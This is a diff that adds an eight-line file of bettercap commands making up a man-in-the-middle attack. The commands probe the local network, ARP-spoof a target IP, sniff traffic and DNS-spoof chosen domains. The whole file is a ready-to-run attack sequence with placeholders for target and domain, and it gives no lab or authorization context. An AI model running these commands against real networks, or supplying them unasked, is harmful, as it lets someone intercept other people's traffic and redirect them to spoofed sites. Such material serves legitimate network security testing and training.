@@ -1,0 +1,8 @@
+sudo bettercap
+net.probe on
+net.show
+set arp.spoof.targets <ip>
+arp.spoof on
+net.sniff on
+set dns.spoof.domains <domain>
+dns.spoof on
